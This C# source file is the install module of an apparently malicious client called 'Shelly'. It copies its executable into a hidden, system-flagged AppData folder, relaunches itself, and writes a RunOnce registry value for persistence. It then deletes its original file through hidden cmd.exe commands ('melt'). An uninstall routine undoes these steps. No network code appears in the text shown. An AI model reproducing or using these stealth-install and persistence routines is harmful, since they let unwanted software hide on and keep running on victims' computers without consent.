using System;
using System.IO;
using Microsoft.Win32;
using System.Diagnostics;

namespace Shelly_Client
{
    class InstallFunctions
    {
        public static void Install()
        {
            // Check if another instance is already installed
            if (Directory.Exists(Program.Appdata + @"\Shelly"))
            {
                // Melt
                Cmd("timeout /t 3 & del Shelly.exe");

                // Exit
                Environment.Exit(0);
            }

            // Create folder in appdata
            Directory.SetCurrentDirectory(Program.Appdata);
            Directory.CreateDirectory("Shelly");

            // Set folder to system hidden
            Cmd("attrib +S +H Shelly");

            // Copy file to folder
            File.Copy(Program.ExecutionPath + @"\Shelly.exe", Program.Appdata + @"\Shelly\Shelly.exe");

            // Start file
            Directory.SetCurrentDirectory(Program.Appdata + @"\Shelly");
            Process.Start(Program.Appdata + @"\Shelly\Shelly.exe");

            // Add startup key
            StartupKey("Add");

            // Goto initial execution path
            Directory.SetCurrentDirectory(Program.ExecutionPath);

            // Melt
            Cmd("timeout /t 3 & del Shelly.exe");

        }

        public static void Uninstall()
        {
            // Remove startup key
            StartupKey("Remove");

            // Remove folder
            Directory.SetCurrentDirectory(Program.Appdata);
            Cmd("timeout /t 3 & rd /s /q Shelly");
        }


        // Run cmd command method
        public static void Cmd(string Command)
        {
            // Declare new instance
            var CmdCommand = new Process();

            // Set start info
            ProcessStartInfo startInfoMelt = new ProcessStartInfo()
            {
                WindowStyle = ProcessWindowStyle.Hidden,
                FileName = "cmd.exe",
                Arguments = @"/C " + Command
            };
            CmdCommand.StartInfo = startInfoMelt;

            // Start cmd with arguments
            CmdCommand.Start();
        }

        // Add/remove startup key method
        public static void StartupKey(string AddOrRemove)
        {
            // Open the runonce registry folder
            using (RegistryKey AddKey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", true))
            {
                // If choose equals true, add startup key, if not, remove it
                if (AddOrRemove == "Add")
                {
                    // Add key
                    AddKey.SetValue("Shelly", Program.Appdata + @"\Shelly\Shelly.exe");
                }
                else
                {
                    // Delete Key
                    AddKey.DeleteValue("Shelly");
                }
            }
        }
    }
}
